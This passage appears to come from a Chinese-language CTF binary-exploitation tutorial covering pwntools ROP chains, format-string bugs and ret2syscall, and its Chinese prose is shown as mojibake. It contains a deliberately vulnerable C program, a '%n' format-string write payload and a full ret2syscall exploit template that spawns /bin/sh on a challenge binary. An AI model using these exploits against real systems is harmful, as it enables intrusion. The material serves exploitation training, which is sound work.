elf.asm(elf.address, 'ret')
elf.save('/tmp/quiet-cat')
disasm(file('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```

## 4.6-ROPé“¾ç”Ÿæˆå™¨

ROPæ¨¡å—çš„ä½œç”¨ï¼Œå°±æ˜¯è‡ªåŠ¨åœ°å¯»æ‰¾ç¨‹åºé‡Œçš„gadgetï¼Œè‡ªåŠ¨åœ¨æ ˆä¸Šéƒ¨ç½²å¯¹åº”çš„å‚æ•°ã€‚

```
PYTHON
elf = ELF('ropasaurusrex')
rop = ROP(elf)
rop.read(0, elf.bss(0x80))
rop.dump()
# ['0x0000:        0x80482fc (read)',
#  '0x0004:       0xdeadbeef',
#  '0x0008:              0x0',
#  '0x000c:        0x80496a8']
str(rop)
# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'
```

ä½¿ç”¨`ROP(elf)`æ¥äº§ç”Ÿä¸€ä¸ªropçš„å¯¹è±¡ï¼Œè¿™æ—¶ropé“¾è¿˜æ˜¯ç©ºçš„ï¼Œéœ€è¦åœ¨å…¶ä¸­æ·»åŠ å‡½æ•°ã€‚

å› ä¸ºROPå¯¹è±¡å®ç°äº†`__getattr__`çš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡func callçš„å½¢å¼æ¥æ·»åŠ å‡½æ•°ï¼Œ`rop.read(0, elf.bss(0x80))`å®é™…ç›¸å½“äº`rop.call('read', (0, elf.bss(0x80)))`ã€‚ é€šè¿‡å¤šæ¬¡æ·»åŠ å‡½æ•°è°ƒç”¨ï¼Œæœ€åä½¿ç”¨strå°†æ•´ä¸ªrop chain dumpå‡ºæ¥å°±å¯ä»¥äº†ã€‚

> - call(resolvable, arguments=()) : æ·»åŠ ä¸€ä¸ªè°ƒç”¨ï¼Œresolvableå¯ä»¥æ˜¯ä¸€ä¸ªç¬¦å·ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªintå‹åœ°å€ï¼Œæ³¨æ„åé¢çš„å‚æ•°å¿…é¡»æ˜¯å…ƒç»„å¦åˆ™ä¼šæŠ¥é”™ï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªå‚æ•°ä¹Ÿè¦å†™æˆå…ƒç»„çš„å½¢å¼(åœ¨åé¢åŠ ä¸Šä¸€ä¸ªé€—å·)
> - chain() : è¿”å›å½“å‰çš„å­—èŠ‚åºåˆ—ï¼Œå³payload
> - dump() : ç›´è§‚åœ°å±•ç¤ºå‡ºå½“å‰çš„rop chain
> - raw() : åœ¨rop chainä¸­åŠ ä¸Šä¸€ä¸ªæ•´æ•°æˆ–å­—ç¬¦ä¸²
> - search(move=0, regs=None, order=â€™sizeâ€™) : æŒ‰ç‰¹å®šæ¡ä»¶æœç´¢gadgetï¼Œæ²¡ä»”ç»†ç ”ç©¶è¿‡
> - unresolve(value) : ç»™å‡ºä¸€ä¸ªåœ°å€ï¼Œåè§£æå‡ºç¬¦å·

## 4.7-æ•°æ®å¤„ç†

å¯¹äºæ•´æ•°çš„**pack**ä¸æ•°æ®çš„**unpack**ï¼Œå¯ä»¥ä½¿ç”¨`p32`,`p64`,`u32`,`u64`è¿™äº›å‡½æ•°ï¼Œåˆ†åˆ«å¯¹åº”ç€32ä½å’Œ64ä½çš„æ•´æ•°ã€‚

## 5-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´

#### æ¼æ´æœºåˆ¶

[![image-20211001173454719](http://image.shangu127.top/img/2021/10/01/68157_image-20211001173454719.png)](http://image.shangu127.top/img/2021/10/01/68157_image-20211001173454719.png)

```
C
printf("name:%s,num:%d",a); //è¿™æ˜¯æ­£å¸¸æƒ…å†µä¸‹çš„printfå‡½æ•°ï¼Œé‡Œé¢çš„%då°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦
printf(a);     //è¿™æ ·ä¹¦å†™å°±å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ã€‚
```

ç®€å•çš„è§£é‡Šå°±æ˜¯ï¼Œprintf å‡½æ•°ä¼šé»˜è®¤è¯»å– â€œ name:%s,num:%d â€ ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¦‚æœé‡Œé¢æ²¡æœ‰%çš„è¯å°±æ­£å¸¸è¾“å‡ºã€‚å¦‚æœé‡Œé¢å«æœ‰ % é‚£å°±æŒ‰ç…§å¯¹åº”çš„æ ¼å¼å»åé¢å¯»æ‰¾å‚æ•°ã€‚

> %cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚
>
> %dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚
>
> %xï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œå¦‚%iè¡¨ç¤ºè¦æ³„æ¼åç§»å¤„å­—èŠ‚é•¿çš„è¿›åˆ¶æ•°æ®ï¼Œxè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„4å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œlxè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„8å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚
>
> %pï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œä¸%xåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€0xï¼Œåœ¨32bitä¸‹è¾“å‡º4å­—èŠ‚ï¼Œåœ¨64bitä¸‹è¾“å‡º8å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯32bitè¿˜æ˜¯64bitã€‚
>
> %sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚
>
> %nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ï¼Œå¦‚%100Ã—10è¡¨ç¤ºå°†å†™å…¥åç§»å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆå­—èŠ‚ï¼‰ï¼Œè€Œnè¡¨ç¤ºå°†0x64å†™å…¥åç§»10å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œè€Œhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º2å­—èŠ‚ï¼Œ%è¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸ºå­—èŠ‚ï¼Œhhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º1å­—èŠ‚ï¼Œllnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º8å­—èŠ‚ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚æœ‰æ—¶ï¼Œç›´æ¥å†™4å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%æˆ–hnæˆ–hhnæ¥é€‚æ—¶è°ƒæ•´ã€‚
>
> %næ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œè€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%nå†™æ•°æ®ã€‚

æ›´å·§çš„æ˜¯å³ä¾¿åé¢çš„å‚æ•°ä¸å¤Ÿï¼Œä»–ä¹Ÿèƒ½ç»§ç»­è¾“å‡ºã€‚è¿™å°±ç»™äº†æˆ‘ä»¬åˆ©ç”¨çš„æ¼æ´ã€‚
ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š
æ‰§è¡ŒæŒ‡ä»¤ç¼–è¯‘ä»¥ä¸‹ä»£ç ï¼Œå¦‚æœç¼–è¯‘æŠ¥é”™ï¼Œè¯´æ˜ä½ çš„gccä¸æ˜¯å®Œæ•´çš„ï¼Œä¸æ”¯æŒç¼–è¯‘32ä½ç¨‹åºï¼Œæ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤å®‰è£…gccæ’ä»¶ã€‚

```
BASH
gcc -m32 -fno-stack-protector -no-pie -o fs1 string.c
sudo apt-get install gcc-multilib
C
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

gdbè°ƒè¯•ä¸€ä¸‹å°±ä¼šå‘ç°ï¼Œä»–ä¼šç»§ç»­è¾“å‡ºæ ˆçš„ä¿¡æ¯ã€‚

[![image-20211001194419712](http://image.shangu127.top/img/2021/10/01/29083_image-20211001194419712.png)](http://image.shangu127.top/img/2021/10/01/29083_image-20211001194419712.png)

è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ â€œ %n â€ è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦å¯¹æ ˆè¿›è¡Œä¿®æ”¹ã€‚

åœ¨å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯å·²çŸ¥å­˜æ”¾ a1 åœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºæœ€æ—©è¾“å‡ºçš„ä½ç½®ã€‚
æˆ‘ä»¬åªéœ€è¦è®¡ç®—å‡ºè¾“å‡ºä¿¡æ¯åœ¨æ ˆä¸­çš„åç§»é‡ï¼Œå°±å¯ä»¥å¯¹æ ˆè¿›è¡Œç²¾å‡†åˆ¶å¯¼äº†ã€‚
å¦‚æœè¿˜ä¸ç†è§£åŸç†çš„è¯ï¼Œå›å¤´ä»”ç»†çœ‹çœ‹ %n çš„ä½œç”¨ã€‚

[![image-20211001203033509](http://image.shangu127.top/img/2021/10/01/74870_image-20211001203033509.png)](http://image.shangu127.top/img/2021/10/01/74870_image-20211001203033509.png)

æˆ‘ç›´æ¥æ‰‹åŠ¨æµ‹è¯• a1 ä½ç½®ï¼Œè¾“å…¥åä¸ª â€œ %p_ â€ï¼Œåœ¨ç»“æœé‡Œæ‰¾ä¸€ä¸‹è¿™ä¿©ï¼š

> secret[0] is 604260
> secret[1] is 604264
>
> æµ‹è¯•æŒ‡ä»¤ï¼šç»™v2èµ‹å€¼1ï¼Œè¿™æ ·å¥½æ‰¾ï¼Œç„¶åè¾“å…¥å¤§é‡ %p
>
> [![image-20211001203258635](http://image.shangu127.top/img/2021/10/01/40355_image-20211001203258635.png)](http://image.shangu127.top/img/2021/10/01/40355_image-20211001203258635.png)

æ•°ä¸€ä¸‹ä¸€å…±å…­ä¸ªæ•°æ®ï¼Œå®é™…ä¸Šå°±æ˜¯é‚£å…­ä¸ªå¯„å­˜å™¨ã€‚åç§»é‡å°±æ˜¯ â€œ 7 â€ã€‚
çŸ¥é“åç§»é‡ä»¥åï¼Œå°±å¯ä»¥ç›´æ¥åœ¨ v2 ä¸­è¾“å…¥è¦ä¿®æ”¹æ•°æ®çš„åœ°å€ã€‚ç„¶ååˆ©ç”¨ %n è¿›è¡Œä¿®æ”¹ã€‚
payloadå¤§æ¦‚å°±é•¿è¿™æ ·ï¼š

```
PYTHON
v2 = str(604260)
payload = %85d%7$n
```

#### è§£é¢˜å·¥å…·

pwntoolsè‡ªå¸¦äº†ä¸€ä¸ªæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºpayloadçš„å‡½æ•°ï¼šfmstr

```python
payload = fmtstr_payload(11,{num_adr:0x4})
```

æ–‡æ¡£å¦‚ä¸‹ï¼š

```python
class FmtStr(object):

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten

        if self.offset is None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

	...

```

execute_fmt, äº¤äº’å‡½æ•°
offset(=None), ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡
padlen(=0), payloadä¹‹å‰å¡«å……çš„å­—èŠ‚æ•°
numbwritten(=0), å·²å†™å…¥çš„å­—èŠ‚æ•°

```python
def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy="small", badbytes=frozenset(), offset_bytes=0):
    sz = WRITE_SIZE[write_size]
    szmax = WRITE_SIZE[write_size_max]
    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)

    fmt = b""
    for _ in range(1000000):
        data_offset = (offset_bytes + len(fmt)) // context.bytes
        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten)
        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)

        if len(fmt) + offset_bytes == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data

```

offset, ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡
writes, å¾€addré‡Œå†™å…¥valueå€¼
numbwritten=0, å·²ç»ç”±printfå†™å…¥çš„å­—èŠ‚æ•°
write_size=â€˜byteâ€™, æŒ‡å®šé€byte/short/intå†™

## ret2syscall

è¿™ç±»é¢˜ç›®æ²¡æœ‰ `system ()` è¿™ç±»çš„å‡½æ•°ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿä¸èƒ½åœ¨æ ˆä¸Šæ‰§è¡Œæˆ‘ä»¬çš„ **shellcode**ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¹‹å‰å­¦åˆ°çš„ **ret2text** å’Œ **ret2shellcode**éƒ½ä¸èƒ½ç”¨ã€‚
æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨[ç³»ç»Ÿè°ƒç”¨](https://link.wangan.com/check?link=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2Fç³»ç»Ÿè°ƒç”¨)ã€‚

éœ€è¦æˆ‘ä»¬è‡ªå·±æ„é€  ropé“¾ã€‚**32ä½**çš„ `syscall` éœ€è¦å‡†å¤‡ä»¥ä¸‹æ¡ä»¶ï¼š

> ğŸ”‘ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ `eax` åº”è¯¥ä¸º **0xb** 64ä½æ˜¯0x3b
> ğŸ”‘ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ `ebx` åº”è¯¥æŒ‡å‘ **/bin/sh** çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚
> ğŸ”‘ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ `ecx` åº”è¯¥ä¸º **0**
> ğŸ”‘ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ `edx` åº”è¯¥ä¸º **0**

ä½†æ˜¯è¿™ä¸ªé¢˜æ˜¯ 64ä½çš„ç¨‹åºï¼Œä¸32ä½è¿˜æ˜¯æœ‰å¾ˆå¤§åŒºåˆ«çš„ï¼š

> **ç³»ç»Ÿè°ƒç”¨å·**ä¸åŒ.æ¯”å¦‚**x86**ä¸­ `sys_write` æ˜¯ 4 ï¼Œ`sys_exit` æ˜¯ 1ï¼›
> è€Œx86_64`sys_write` æ˜¯ 1 , `sys_exit` æ˜¯ 60ã€‚
> ç³»ç»Ÿè°ƒç”¨æ‰€ä½¿ç”¨çš„å¯„å­˜å™¨ä¸åŒï¼Œ**x86_64**ä¸­ä½¿ç”¨ä¸ eax å¯¹åº”çš„ rax ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œä½†æ˜¯ **x86_64**ä¸­åˆ†åˆ«ä½¿ç”¨ rdi/rsi/rdx ä¼ é€’å‰ä¸‰ä¸ªå‚æ•°ï¼Œè€Œä¸æ˜¯ **x86** ä¸­çš„ ebx/ecx/edxã€‚
> ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨ â€œ `syscall` â€ è€Œä¸æ˜¯ â€œ `int 80` â€

æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„ä¸€å…±æœ‰è¿™å‡ ä»¶äº‹ï¼š

> 1ã€å°† rax èµ‹å€¼ä¸º 0x3b ï¼ˆsys_execveå‡½æ•°
> 2ã€å°†æˆ‘ä»¬å†™å…¥çš„ â€œ /bin/sh â€ åœ°å€å†™å…¥ rdi ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°
> 3ã€å°† rsi å’Œ rdx ç½® 0

åˆ©ç”¨ROPgadgetè·å–æˆ‘ä»¬éœ€è¦çš„åœ°å€ï¼š

```
BASH
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rax" 
//0x41f884
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rdi"
//0x4016e6
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rdx"
//0x442d16
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rsi"
//0x401807
```

ä»£ç æ¨¡æ¿ï¼š

```python
PYTHON
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
shangu = 0

def main():
	if shangu == 1:
		io = remote("",)
	else:
		io = process("pwn10")
	
	pop_rax = 0x41f884
	pop_rdi = 0x4016e6
	pop_rsi = 0x401807
	pop_rdx = 0x442d16
	shell_adr = 0x006cc000 
	syscall_adr = 0x440415
	mov_rsi_rax = 0x474821
	pop_rsi_rdx = 0x442d39
	
	payload = 112*'a'+p64(0)+p64(pop_rax)+'/bin/sh\x00'+p64(pop_rsi)+p64(shell_adr)+p64(mov_rsi_rax)+p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(shell_adr)+p64(pop_rsi_rdx) + p64(0)+p64(0)+p64(syscall_adr)
	
	 
	io.sendline(payload)
	io.interactive()

main()
```



## æ²™ç®±ä¿æŠ¤

ä½¿ç”¨checksecæ£€æŸ¥å¸¸è§„ä¿æŠ¤æœºåˆ¶ï¼Œä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤æ£€æŸ¥æ²™ç®±è§„åˆ™ï¼š

```bash
seccomp-tools dump ./pwn
```

æ²™ç®±è§„åˆ™ä¼šç¦æ­¢è¿›è¡ŒæŸäº›ç³»ç»Ÿè°ƒç”¨